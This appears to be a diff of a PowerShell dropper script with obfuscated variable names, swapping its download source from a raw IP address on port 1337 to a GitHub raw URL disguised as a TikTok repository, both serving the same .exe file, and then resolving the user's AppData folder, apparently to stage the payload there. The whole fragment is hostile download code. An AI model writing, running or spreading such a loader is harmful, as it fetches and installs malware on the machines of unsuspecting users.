@@ -1,5 +1,5 @@
 $gfgff = @(
-    "http://195.2.67.177:1337/files/f8g48gfdbhbyb2y8.exe"
+    "https://raw.githubusercontent.com/JqrkaSt3al/www.tiktok.com/main/video/f8g48gfdbhbyb2y8.exe"
 )
 $dfsgsfdg = [Environment]::GetFolderPath('ApplicationData')
 
